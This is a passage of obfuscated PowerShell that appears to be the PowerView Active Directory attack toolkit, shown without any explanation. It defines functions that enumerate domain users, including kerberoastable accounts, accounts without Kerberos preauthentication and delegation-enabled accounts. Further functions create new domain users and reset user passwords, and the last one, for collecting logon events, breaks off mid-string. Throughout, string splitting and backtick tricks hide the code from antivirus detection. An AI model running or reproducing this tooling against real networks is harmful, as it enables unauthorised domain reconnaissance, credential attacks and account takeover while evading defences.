            }
        }
    }
}








function GeT`-d`OmaiNU`s`er {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{0}{3}{2}{6}{1}{4}"-f'seDec','anAssignm','T','laredVarsMore','ents','PSU','h'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}" -f 'PSS','uldProcess','ho'}, '')]
    [OutputType({"{1}{2}{0}"-f 'User','Po','werView.'})]
    [OutputType({"{4}{2}{1}{3}{0}" -f'aw','Us','iew.','er.R','PowerV'})]
    [CmdletBinding(dEfAuLTpaRaMetErsETnaME = {"{3}{1}{4}{0}{2}" -f't','De','ion','Allow','lega'})]
    Param(
        [Parameter(PosItioN = 0, valUeFRoMpIpEliNE = ${t`Rue}, valUeFRoMpIPELiNebYProPErtyNAmE = ${tR`Ue})]
        [Alias({"{1}{3}{0}{2}"-f'nguished','Di','Name','sti'}, {"{2}{1}{0}{3}{4}"-f'c','amAc','S','ount','Name'}, {"{0}{1}" -f'N','ame'}, {"{4}{1}{2}{0}{3}" -f'guis','Disti','n','hedName','Member'}, {"{0}{2}{1}"-f'M','mberName','e'})]
        [String[]]
        ${I`deNt`ITY},

        [Switch]
        ${s`pN},

        [Switch]
        ${Ad`M`IncOuNT},

        [Parameter(parAmEtErsetNAME = "a`lLoWDe`Le`gat`IOn")]
        [Switch]
        ${a`LL`oWdel`e`gA`TioN},

        [Parameter(PARameTERsEtnAMe = "DI`sAlLOwDele`GAT`Ion")]
        [Switch]
        ${Di`salloWd`EL`EGATION},

        [Switch]
        ${tRUs`Tedto`A`Uth},

        [Alias({"{5}{0}{4}{3}{2}{1}{6}" -f 'erb','t','No','Preauth','eros','K','Required'}, {"{3}{2}{1}{0}"-f'h','t','u','NoPrea'})]
        [Switch]
        ${pR`Ea`UtH`No`TREquIREd},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`om`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'lte','Fi','r'})]
        [String]
        ${ld`Ap`F`iLTeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prop`eRT`IEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'th','ADSPa'})]
        [String]
        ${S`Ea`RCh`BasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{2}{3}{1}" -f 'Domai','ller','ont','ro','nC'})]
        [String]
        ${se`RVEr},

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{2}{1}{0}" -f 'el','Lev','One'}, {"{0}{1}{2}" -f'Su','b','tree'})]
        [String]
        ${sE`A`RCH`SCopE} = ("{0}{1}{2}" -f'Su','bt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resuLTp`A`GESIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`eR`VeRTiMeLiM`IT},

        [ValidateSet({"{0}{1}" -f'Dac','l'}, {"{0}{1}" -f 'Gr','oup'}, {"{1}{0}"-f 'e','Non'}, {"{0}{1}" -f'O','wner'}, {"{1}{0}" -f 'acl','S'})]
        [String]
        ${seCU`Rit`yma`SkS},

        [Switch]
        ${T`OmBs`TOne},

        [Alias({"{2}{1}{0}"-f'e','eturnOn','R'})]
        [Switch]
        ${fI`NDo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REd`EnTI`Al} =  ( &('gi')  ('vA'+'RiABle'+':jh3xO'+'6') )."vAl`UE"::"EMP`TY",

        [Switch]
        ${r`Aw}
    )

    DynamicParam {
        ${UaCvAlU`eNA`M`es} =   (&("{1}{0}{2}"-f'Te','cHIlDI','m')  ("vA"+"RIABLE"+":1"+"QYBI")  )."VAl`UE"::("{1}{0}{2}"-f'am','GetN','es').Invoke(${UaC`e`NuM})
        
        ${UaC`Val`Uen`AmEs} = ${Uac`VAl`U`EnaMEs} | &("{0}{2}{1}{3}" -f'ForE','Obj','ach-','ect') {${_}; "NOT_$_"}
        
        &("{3}{5}{0}{2}{4}{1}"-f '-','amicParameter','D','N','yn','ew') -Name ("{2}{1}{0}" -f 'ilter','ACF','U') -ValidateSet ${Uac`VAluE`Na`MES} -Type ([array])
    }

    BEGIN {
        ${SEArc`HERARG`UM`E`N`Ts} = @{}
        if (${Ps`BouNDPA`RA`mEtE`RS}[("{0}{1}{2}" -f 'Dom','a','in')]) { ${SEarCh`erar`gUM`e`NTs}[("{1}{2}{0}"-f 'main','D','o')] = ${DOM`A`iN} }
        if (${P`SbOUn`Dparame`TErS}[("{2}{0}{1}"-f 'rope','rties','P')]) { ${SEaR`cHe`Rar`guMeNts}[("{0}{1}{2}"-f 'P','ropertie','s')] = ${ProPe`Rt`iES} }
        if (${PSBO`U`NdP`A`RAMeTE`Rs}[("{1}{2}{0}" -f'e','Search','Bas')]) { ${S`eaR`cH`ErARgUMENtS}[("{2}{0}{1}"-f 'a','rchBase','Se')] = ${S`eArCH`BaSe} }
        if (${PSBo`Undp`ARaMETe`RS}[("{0}{1}" -f 'S','erver')]) { ${sEARC`Her`ARg`UM`ENtS}[("{2}{1}{0}" -f'ver','r','Se')] = ${Se`R`Ver} }
        if (${p`SBoU`ND`paRaM`E`TERS}[("{1}{0}{2}"-f'rch','Sea','Scope')]) { ${seaR`ch`eraR`G`UmentS}[("{0}{2}{3}{1}" -f'Se','e','ar','chScop')] = ${SEA`RChSC`opE} }
        if (${PS`BO`UNdparamET`eRS}[("{2}{0}{1}{3}{4}" -f'l','tPa','Resu','geSi','ze')]) { ${sE`Arch`ErAr`GU`M`ENTs}[("{3}{2}{1}{0}"-f 'geSize','tPa','l','Resu')] = ${reSU`ltPAg`E`sIZE} }
        if (${Psbo`UN`D`pArAmE`TerS}[("{0}{1}{2}"-f'Serv','erTimeL','imit')]) { ${seaRcH`ERa`R`GuMENTs}[("{0}{2}{1}"-f'Server','imeLimit','T')] = ${s`E`RVER`Tim`eLimIT} }
        if (${pSboUn`D`P`ArAmeTe`RS}[("{0}{1}{2}" -f 'S','ecuri','tyMasks')]) { ${S`eaRCH`ErArGUmE`NTS}[("{2}{0}{1}"-f 'cu','rityMasks','Se')] = ${se`Cu`RItYM`AskS} }
        if (${p`s`BOUnDPA`Ra`me`TErS}[("{1}{2}{0}"-f'one','T','ombst')]) { ${s`E`A`RCH`erARgUm`Ents}[("{0}{2}{1}" -f'Tom','stone','b')] = ${t`oMBSTO`Ne} }
        if (${PsBoUn`dPArA`M`e`TErs}[("{0}{1}{2}" -f'Crede','ntia','l')]) { ${Search`e`RArG`Uments}[("{0}{1}{2}"-f'C','redentia','l')] = ${C`Red`ENTI`AL} }
        ${useRS`E`A`R`cHeR} = &("{1}{0}{2}{3}"-f 'Sear','Get-Domain','c','her') @SearcherArguments
    }

    PROCESS {
        
        if (${PS`B`OundPA`RAM`Eters} -and (${psboU`ND`Pa`Ram`ET`erS}."COu`Nt" -ne 0)) {
            &("{2}{4}{3}{1}{0}{5}"-f 't','me','Ne','ra','w-DynamicPa','er') -CreateVariables -BoundParameters ${pSB`OundpAr`AMe`TE`RS}
        }

        if (${usERs`EAR`Ch`er}) {
            ${iD`E`N`TITyFilteR} = ''
            ${FI`l`Ter} = ''
            ${i`De`NtIty} | &("{2}{0}{1}" -f'h','ere-Object','W') {${_}} | &("{3}{1}{0}{2}" -f 'ec','-Obj','t','ForEach') {
                ${I`de`Nti`T`yinsTA`Nce} = ${_}.("{0}{2}{1}"-f 'Re','lace','p').Invoke('(', '\28').("{1}{0}" -f 'e','Replac').Invoke(')', '\29')
                if (${I`d`E`NT`ITyINSt`AncE} -match ("{0}{1}"-f '^S','-1-')) {
                    ${IDe`N`TitYf`Ilt`eR} += "(objectsid=$IdentityInstance)"
                }
                elseif (${iD`En`TiTYin`STaNce} -match ("{0}{1}" -f'^','CN=')) {
                    ${iD`EntItYF`i`l`TeR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${p`S`Bo`UnDpA`RamEt`ErS}[("{1}{2}{0}"-f'ain','Do','m')]) -and (-not ${psboUNd`P`ArA`me`TerS}[("{0}{2}{1}"-f'S','Base','earch')])) {
                        
                        
                        ${idEnt`ITyd`oMA`In} = ${iden`TITyin`s`T`A`NCe}.("{2}{1}{0}" -f 'bString','u','S').Invoke(${iDe`NTIt`y`INs`Ta`NCe}.("{1}{0}{2}" -f 'de','In','xOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{2}{0}" -f 'Verbose','Wri','te-') ('[Get-'+'Doma'+'inUs'+'er]'+' '+'Ex'+'tr'+'acted '+'do'+'main '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${se`Ar`chErA`RG`UMEnTs}[("{0}{1}" -f 'Domai','n')] = ${ID`E`NTITYDOM`Ain}
                        ${usE`R`S`Ea`RcHeR} = &("{3}{1}{0}{2}" -f'-D','et','omainSearcher','G') @SearcherArguments
                        if (-not ${uSE`RSE`Arc`hEr}) {
                            &("{3}{2}{0}{1}" -f 'e-War','ning','rit','W') ('['+'Get-'+'DomainU'+'se'+'r'+'] '+'Un'+'able '+'t'+'o '+'retrie'+'ve'+' '+'doma'+'i'+'n '+'sea'+'rcher'+' '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${iDEntI`T`yiNsT`ANCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${GU`i`DB`YteSTrIng} = (([Guid]${IDe`N`TItYins`TA`NCE}).("{3}{1}{2}{0}"-f 'ay','By','teArr','To').Invoke() | &("{2}{0}{1}{3}" -f'h-O','bjec','ForEac','t') { '\' + ${_}.("{0}{1}"-f 'ToS','tring').Invoke('X2') }) -join ''
                    ${iD`ENT`i`T`yfIlTEr} += "(objectguid=$GuidByteString)"
                }
                elseif (${ideN`TitYinS`Ta`N`Ce}.("{1}{0}" -f'ntains','Co').Invoke('\')) {
                    ${coNve`RT`EDidenT`ItYi`Nst`AncE} = ${id`EntITY`Inst`AN`ce}.("{0}{1}{2}" -f 'R','e','place').Invoke('\28', '(').("{0}{1}"-f'R','eplace').Invoke('\29', ')') | &("{1}{0}{4}{2}{3}"-f'D','Convert-A','a','me','N') -OutputType ("{2}{3}{1}{0}" -f 'al','ic','Ca','non')
                    if (${c`oNVerT`ed`IdE`NTityiNS`Tan`ce}) {
                        ${USEr`d`oMaIn} = ${CoNvErT`EdIDe`N`T`I`TYINS`TA`NCE}.("{2}{0}{1}" -f'u','bString','S').Invoke(0, ${c`On`VerTE`DIDE`NtIt`Y`inST`ANCE}.("{2}{0}{1}" -f'dexO','f','In').Invoke('/'))
                        ${u`se`Rname} = ${ID`EnTItYI`NsT`ANCe}.("{0}{1}"-f 'Spli','t').Invoke('\')[1]
                        ${ideNt`i`TY`F`ILter} += "(samAccountName=$UserName)"
                        ${S`EA`RCh`ErarGu`mEnTs}[("{0}{1}" -f 'Do','main')] = ${u`Se`RDO`mAin}
                        &("{1}{2}{0}"-f 'rbose','Writ','e-Ve') ('[Ge'+'t-Doma'+'inUser]'+' '+'E'+'xtracte'+'d '+'do'+'mai'+'n '+"'$UserDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${us`erS`eArC`HEr} = &("{0}{1}{2}{3}{4}" -f'Get-Dom','a','in','Sear','cher') @SearcherArguments
                    }
                }
                else {
                    ${iDEN`TITy`FiL`Ter} += "(samAccountName=$IdentityInstance)"
                }
            }

            if (${IdENTI`TY`F`Ilt`eR} -and (${Id`eNtit`yFiLT`Er}.("{1}{0}" -f'm','Tri').Invoke() -ne '') ) {
                ${fil`TEr} += "(|$IdentityFilter)"
            }

            if (${p`s`BOU`NDParA`met`erS}['SPN']) {
                &("{0}{2}{1}" -f'W','erbose','rite-V') ("{2}{4}{3}{0}{13}{7}{10}{11}{8}{9}{14}{12}{6}{5}{1}"-f'i','es','[Get-Doma','] Search','inUser',' nam','ipal','g ','non-null se','rv','fo','r ',' princ','n','ice')
                ${Fi`L`TEr} += (("{6}{4}{0}{5}{3}{1}{2}"-f 'r','ipalName=','*)','c','serviceP','in','('))
            }
            if (${ps`B`OuNDP`ARaMe`T`Ers}[("{1}{2}{0}" -f 'on','AllowDele','gati')]) {
                &("{2}{3}{4}{1}{0}"-f'e','bos','Write-','Ve','r') ("{1}{0}{6}{12}{9}{7}{8}{5}{11}{10}{4}{2}{3}"-f'-Domain','[Get',' wh','o can be delegated','s',' us','U','earching',' for',' S','r','e','ser]')
                
                ${fIlt`er} += ((("{6}{2}{9}{1}{5}{8}{0}{7}{11}{10}{4}{3}"-f':','tCon','cou','03:=1048574))','.4.8','t','(!(userAc','1.2.840.','rol','n','556.1','113')))
            }
            if (${P`sBOu`N`dparamEteRs}[("{0}{1}{4}{3}{2}"-f'Disallo','wDe','ion','gat','le')]) {
                &("{2}{1}{0}" -f 'se','e-Verbo','Writ') ("{16}{6}{2}{19}{11}{8}{13}{12}{5}{18}{3}{0}{14}{17}{7}{15}{9}{10}{4}{20}{1}" -f 'users wh','n','Dom','or ','d not trusted for ','n','et-','e ','ea','n','sitive an','r] S','i','rch','o a','se','[G','r','g f','ainUse','delegatio')
                ${f`ILT`eR} += ("{2}{12}{14}{6}{3}{8}{7}{11}{13}{1}{5}{10}{4}{0}{9}"-f'8574','3556','(use','t','4','.1.4.80','n','ntrol:1.2.','Co',')','3:=10','840.','r','11','Accou')
            }
            if (${PS`BO`Un`DPARAMEt`E`RS}[("{2}{1}{0}"-f'nt','Cou','Admin')]) {
                &("{1}{3}{2}{0}" -f 'e','W','os','rite-Verb') ("{7}{10}{11}{1}{4}{3}{8}{6}{2}{0}{5}{9}" -f'u','Se','nCo','ng f','archi','nt','r admi','[Get-Domain','o','=1','Use','r] ')
                ${fil`T`ER} += ("{0}{2}{3}{1}" -f'(adm',')','incoun','t=1')
            }
            if (${psboUnDPAR`AM`Ete`Rs}[("{1}{2}{0}"-f 'th','TrustedTo','Au')]) {
                &("{3}{0}{2}{1}" -f't','rbose','e-Ve','Wri') ("{10}{11}{3}{12}{9}{17}{13}{5}{21}{20}{4}{15}{2}{18}{0}{16}{14}{6}{7}{8}{19}{1}"-f 'e for ','ls','h','t-Domai','ted','hat are tr','er',' pr','i','] Searching ','[G','e','nUser','users t','h',' to aut','ot','for ','enticat','ncipa','s','u')
                ${F`il`Ter} += (("{4}{1}{3}{0}{5}{2}"-f'dto','-all','elegateto=*)','owe','(msds','d'))
            }
            if (${ps`BO`UN`dpARaM`et`eRs}[("{1}{3}{2}{4}{0}" -f 'ired','Pre','uthNotR','a','equ')]) {
                &("{2}{4}{3}{1}{0}" -f'se','bo','Wr','te-Ver','i') ("{20}{13}{15}{2}{19}{16}{10}{18}{17}{11}{1}{12}{6}{7}{8}{3}{14}{5}{9}{4}{0}"-f 'henticate',' f','oma','t require',' preaut','ber','r user accounts t','h','at do no','os','er] Sea','g','o','Get',' ker','-D','s','chin','r','inU','[')
                ${F`iLT`ER} += ("{1}{9}{6}{5}{10}{7}{2}{4}{3}{11}{8}{0}{12}"-f'419','(u',':1.2','840.113556.1.4.80','.','t','ccoun','l','=','serA','Contro','3:','4304)')
            }
            if (${PSBo`UN`DparAMeT`ers}[("{1}{0}{2}" -f'il','LDAPF','ter')]) {
                &("{0}{3}{4}{1}{2}" -f'Wr','bos','e','ite-Ve','r') ('[Get'+'-'+'DomainUse'+'r'+']'+' '+'U'+'sin'+'g '+'addi'+'tion'+'a'+'l '+'L'+'DAP '+'fi'+'lter: '+"$LDAPFilter")
                ${FI`L`TER} += "$LDAPFilter"
            }

            
            ${UA`C`FIlTER} | &("{3}{1}{0}{2}"-f're-Obje','e','ct','Wh') {${_}} | &("{2}{1}{0}"-f 't','Each-Objec','For') {
                if (${_} -match ("{0}{2}{1}"-f'N','.*','OT_')) {
                    ${UA`cFi`ElD} = ${_}.("{0}{1}" -f'Substrin','g').Invoke(4)
                    ${u`A`c`VALue} = [Int](${u`AC`eNUM}::${ua`cF`IELD})
                    ${F`IL`Ter} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${u`A`cVAlUE} = [Int](${uA`cEn`UM}::${_})
                    ${Fi`LT`ER} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${U`SER`s`EaRCher}."FiL`Ter" = "(&(samAccountType=805306368)$Filter)"
            &("{1}{2}{0}"-f'Verbose','Write','-') "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if (${p`SBouN`dp`ARaMETErS}[("{0}{1}"-f 'FindO','ne')]) { ${r`es`UlTs} = ${us`ER`s`EaRch`ER}.("{1}{0}"-f 'ne','FindO').Invoke() }
            else { ${reSuL`TS} = ${US`er`SEA`RcHEr}.("{2}{0}{1}" -f 'nd','All','Fi').Invoke() }
            ${Re`s`Ults} | &("{3}{1}{2}{0}"-f'bject','re','-O','Whe') {${_}} | &("{0}{2}{1}{3}" -f'F','ch-Ob','orEa','ject') {
                if (${Ps`B`OUn`d`paRAmE`TERs}['Raw']) {
                    
                    ${us`Er} = ${_}
                    ${U`seR}."PSoBj`E`CT"."TypeN`A`MeS".("{1}{0}" -f 't','Inser').Invoke(0, ("{0}{3}{2}{4}{1}" -f 'Pow','aw','User','erView.','.R'))
                }
                else {
                    ${u`SER} = &("{3}{1}{0}{4}{2}"-f'-LDAPP','vert','rty','Con','rope') -Properties ${_}."pRop`ERTI`es"
                    ${Us`eR}."pSo`BJEct"."ty`pena`meS".("{1}{2}{0}" -f't','In','ser').Invoke(0, ("{0}{3}{2}{1}" -f'P','er','View.Us','ower'))
                }
                ${U`sEr}
            }
            if (${ResU`LtS}) {
                try { ${r`E`sULTS}.("{0}{1}"-f'di','spose').Invoke() }
                catch {
                    &("{0}{1}{3}{2}" -f'W','ri','bose','te-Ver') ('[Get-'+'Domain'+'U'+'s'+'er] '+'Erro'+'r'+' '+'dispos'+'i'+'ng '+'o'+'f '+'the'+' '+'Res'+'ult'+'s '+'ob'+'j'+'ect: '+"$_")
                }
            }
            ${uSErS`eARcH`ER}.("{1}{0}{2}"-f's','di','pose').Invoke()
        }
    }
}


function N`EW`-DoMaIn`U`SeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{9}{7}{6}{8}{4}{3}{1}{2}{10}{5}{0}"-f 'ions','han','gin','essForStateC','Proc','nct','seS','SU','hould','P','gFu'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{4}{3}" -f'P','ld','PSShou','ss','roce'}, '')]
    [OutputType({"{4}{8}{3}{2}{6}{0}{9}{7}{5}{1}"-f'es.AccountM','rPrincipal','r','Se','Dir','.Use','vic','ment','ectory','anage'})]
    Param(
        [Parameter(mANdATORY = ${Tr`Ue})]
        [ValidateLength(0, 256)]
        [String]
        ${S`AmAC`coUn`Tna`ME},

        [Parameter(mANdaTORy = ${tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'word','Pass'})]
        [Security.SecureString]
        ${a`cCouNtp`A`sswo`Rd},

        [ValidateNotNullOrEmpty()]
        [String]
        ${n`AME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DI`spLAy`NAmE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DEs`Cr`ipT`iON},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oMaiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`DENT`iAl} =  ( &("{1}{0}{2}"-f'te','chIlDI','M')  ("{2}{1}{3}{0}" -f '3Xo6','RiABlE:','Va','jH'))."VAl`Ue"::"E`mptY"
    )

    ${Cont`eX`Ta`RGuMeNTS} = @{
        ("{2}{1}{0}"-f 'ty','enti','Id') = ${saMACcoUn`Tn`AmE}
    }
    if (${pSBO`UNd`pArAm`eT`erS}[("{1}{0}" -f 'in','Doma')]) { ${C`onte`X`TargumE`NTs}[("{0}{2}{1}"-f 'D','in','oma')] = ${DOmA`iN} }
    if (${PsBOUn`Dpar`AMe`T`e`RS}[("{2}{0}{1}"-f 'e','dential','Cr')]) { ${CoN`T`E`x`TArgUmEnts}[("{0}{2}{1}"-f 'Cr','ential','ed')] = ${CrEDeN`Ti`Al} }
    ${CO`NTexT} = &("{2}{4}{3}{0}{1}" -f 'ipalCon','text','Get-P','nc','ri') @ContextArguments

    if (${COn`Te`XT}) {
        ${uS`Er} = &("{2}{3}{0}{1}"-f'w-Obje','ct','N','e') -TypeName ("{8}{14}{4}{9}{13}{12}{5}{3}{15}{2}{0}{16}{10}{11}{6}{1}{7}" -f 's','p','.U','men','ervi','ge','nci','al','System.Direc','ces.A','r','Pri','ana','ccountM','toryS','t','e') -ArgumentList (${CoNtE`xT}."COn`TExt")

        
        ${US`Er}."S`A`Mac`cOUntnAme" = ${cONT`E`xT}."i`dENti`Ty"
        ${Te`mpcRED} = &("{2}{1}{0}"-f'bject','O','New-') ("{7}{1}{5}{0}{2}{9}{12}{4}{8}{3}{10}{6}{11}"-f 'n','s','t.A','d','io','tem.Manageme','t','Sy','n.PSCre','utom','en','ial','at')('a', ${a`C`Co`UnTpaSSwORd})
        ${US`eR}.("{0}{1}{2}"-f'S','etPa','ssword').Invoke(${TE`mPc`ReD}.("{4}{5}{2}{3}{0}{1}"-f 'a','l','e','denti','GetNetwor','kCr').Invoke()."paS`SwORD")
        ${u`sEr}."En`AB`lEd" = ${tR`UE}
        ${u`Ser}."PAS`swO`Rd`NotREQ`UIr`Ed" = ${F`AlSE}

        if (${PS`B`OuNDP`ARAmETE`RS}[("{1}{0}"-f'ame','N')]) {
            ${us`ER}."N`Ame" = ${N`AmE}
        }
        else {
            ${uS`er}."na`Me" = ${C`Onte`XT}."ide`Nti`TY"
        }
        if (${PsBOU`NdPA`RAmeTE`RS}[("{2}{3}{0}{1}" -f'yNam','e','Di','spla')]) {
            ${u`ser}."DI`s`pLA`YNAME" = ${d`ispL`AYnA`Me}
        }
        else {
            ${u`SeR}."Dis`P`LAYnA`Me" = ${cO`NTE`xt}."i`DeNti`TY"
        }

        if (${PSBoUN`D`pa`RA`ME`Ters}[("{0}{2}{1}"-f'D','ption','escri')]) {
            ${U`SEr}."De`sCRIP`TIoN" = ${DESCRip`T`ioN}
        }

        &("{1}{0}{2}"-f'rbo','Write-Ve','se') ('[Ne'+'w-Domai'+'nUser]'+' '+'A'+'ttempti'+'n'+'g '+'to'+' '+'cre'+'a'+'te '+'use'+'r '+"'$SamAccountName'")
        try {
            ${nU`LL} = ${U`SER}.("{0}{1}" -f'Sav','e').Invoke()
            &("{0}{1}{3}{2}"-f 'Write-Ve','rbo','e','s') ('['+'New'+'-DomainUser'+'] '+'U'+'ser '+"'$SamAccountName' "+'succ'+'es'+'sf'+'ully '+'cre'+'ate'+'d')
            ${u`SER}
        }
        catch {
            &("{2}{0}{1}"-f 'e-','Warning','Writ') ('[N'+'ew-D'+'omainU'+'s'+'er] '+'Er'+'r'+'or '+'c'+'reati'+'ng '+'use'+'r '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function sET-`d`omAinU`s`ErPasSwO`Rd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{10}{5}{6}{3}{9}{8}{7}{1}{0}{2}" -f'cti','n','ons','s','P','eShouldP','roce','hangingFu','eC','sForStat','SUs'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}"-f'cess','PSShoul','dPro'}, '')]
    [OutputType({"{2}{5}{12}{7}{8}{10}{9}{6}{11}{3}{4}{13}{0}{1}" -f'Principa','l','D','agement.','U','irectoryServi','M','cco','u','t','n','an','ces.A','ser'})]
    Param(
        [Parameter(pOSiTiOn = 0, mandATorY = ${t`RUE})]
        [Alias({"{1}{2}{0}" -f'me','U','serNa'}, {"{0}{1}{2}{3}" -f'Use','rId','entit','y'}, {"{0}{1}" -f 'Use','r'})]
        [String]
        ${Id`Ent`ItY},

        [Parameter(manDATORY = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'P','sword','as'})]
        [Security.SecureString]
        ${acCOuNTPa`S`SWOrD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`omAin},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReDENT`I`AL} =  ( &('LS')  ("{0}{1}{2}"-f 'vARiAbLE:jH3x','O','6'))."v`ALUE"::"E`MptY"
    )

    ${cO`N`T`eX`TArg`UMEnTs} = @{ ("{0}{2}{1}"-f 'I','ity','dent') = ${i`de`NTitY} }
    if (${p`sbOu`NdparAMe`TE`RS}[("{0}{1}" -f'D','omain')]) { ${c`oNTExt`A`RGum`eNts}[("{0}{1}" -f 'Dom','ain')] = ${DOmA`in} }
    if (${p`SBOUN`DPAr`AM`ETERS}[("{1}{0}{2}" -f'ti','Creden','al')]) { ${c`oNTeXTArGU`Men`Ts}[("{0}{2}{1}"-f'C','tial','reden')] = ${Cr`E`DENTiAL} }
    ${CONTe`xt} = &("{2}{5}{0}{1}{3}{4}" -f '-Pr','inci','Ge','pa','lContext','t') @ContextArguments

    if (${co`NtEXT}) {
        ${us`er} = [System.DirectoryServices.AccountManagement.UserPrincipal]::("{1}{0}{2}{3}" -f 'y','FindB','Iden','tity').Invoke(${C`oNtE`xt}."c`oNTe`XT", ${IDeNt`I`TY})

        if (${U`sER}) {
            &("{0}{1}{2}"-f 'Write','-V','erbose') ('[Se'+'t-DomainUser'+'Pas'+'s'+'w'+'or'+'d'+'] '+'Att'+'em'+'pting '+'t'+'o '+'s'+'et '+'the'+' '+'pas'+'swo'+'rd '+'fo'+'r '+'us'+'er '+"'$Identity'")
            try {
                ${TEmPc`R`Ed} = &("{1}{3}{0}{2}"-f'b','N','ject','ew-O') ("{0}{2}{4}{9}{5}{7}{6}{8}{1}{3}"-f 'Syst','e','em','dential','.M','nagem','n','ent.Automatio','.PSCr','a')('a', ${acco`UnT`p`AS`s`word})
                ${u`ser}.("{3}{2}{0}{1}" -f 'wor','d','etPass','S').Invoke(${T`e`MpCreD}.("{4}{5}{2}{1}{6}{3}{0}"-f 'l','kC','wor','ntia','GetN','et','rede').Invoke()."pasSW`ORD")

                ${nu`Ll} = ${uS`ER}.("{0}{1}"-f 'Sav','e').Invoke()
                &("{0}{1}{2}{3}" -f 'Wr','i','te-Ve','rbose') ('[S'+'e'+'t-DomainUse'+'rPasswo'+'rd'+']'+' '+'Pass'+'word '+'for'+' '+'use'+'r '+"'$Identity' "+'succe'+'ss'+'ful'+'l'+'y '+'r'+'eset')
            }
            catch {
                &("{3}{2}{0}{1}" -f 'arni','ng','-W','Write') ('[Se'+'t-D'+'omain'+'U'+'serPassword] '+'E'+'rror '+'settin'+'g'+' '+'passw'+'ord '+'fo'+'r '+'use'+'r '+"'$Identity' "+': '+"$_")
            }
        }
        else {
            &("{1}{0}{2}" -f 'rite-War','W','ning') ('[Set-'+'D'+'omain'+'UserPass'+'word] '+'U'+'nab'+'le '+'t'+'o '+'f'+'ind '+'u'+'ser '+"'$Identity'")
        }
    }
}


function G`et`-Dom`AIn`U`SeREVENt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{4}{1}{0}" -f 'ess','ldProc','ho','PSS','u'}, '')]
    [OutputType({"{4}{5}{1}{3}{0}{2}" -f 'o','ew','gonEvent','.L','Pow','erVi'})]
    [OutputType({"{8}{4}{10}{9}{0}{6}{5}{7}{2}{3}{11}{1}"-f'pli','nEvent','lL','og','ow','itCr','c','edentia','P','iew.Ex','erV','o'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitIon = 0, VALueFROMPipeLiNE = ${tR`Ue}, valueFROMpIPelinebYpROpeRtyname = ${tr`Ue})]
        [Alias({"{2}{1}{0}"-f 'ame','tn','dnshos'}, {"{2}{1}{0}"-f'e','stNam','Ho'}, {"{1}{0}" -f'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COm`PuTer`NA`ME} = ${en`V:cOMP`UteR`Name},

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${sTa`Rt`TimE} =   ${Y0Q}::"N`ow".("{0}{1}{2}"-f 'AddD','ay','s').Invoke(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${e`Ndt`iMe} =  (  &('LS')  ("{0}{2}{3}{1}" -f 'vArIA','y0Q','b','Le:') )."V`AluE"::"n`ow",

        [ValidateRange(1, 1000000)]
        [Int]
        ${mAx`E`VEntS} = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`eDeN`TIAL} =   (&('gI')  ("VaRiab"+"Le:Jh3"+"X"+"o6")  )."va`lUe"::"eM`PtY"
    )

    BEGIN {
        
        ${xpa`ThfiL`TEr} = ((('1Kt'+'
'+'<'+'Que'+'ryLis'+'t>
 ')-RePlace  ([ChaR]49+[ChaR]75+[ChaR]116),[ChaR]34)+' '+' '+' '+'<Qu'+'ery '+('I'+'d=fv'+'50fv5'+' ')."reP`L`ACe"(([CHAr]102+[CHAr]118+[CHAr]53),[STriNg][CHAr]34)+(('Pa'+'th'+'=gn'+'IS'+'ecuri'+'tygn'+'I>

 ') -CrEPlACe 'gnI',[chAR]34)+' '+' '+' '+' '+' '+' '+' '+'<'+'!-- '+'L'+'ogo'+'n '+'eve'+'nt'+'s '+'-->
'+' '+' '+' '+' '+' '+' '+' '+' '+'<S'+'elect '+('Path=e'+'tVSecurit'+'ye'+'tV'+'>'+'
 ')."REP`LAce"('etV',[stRInG][CHar]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'System[
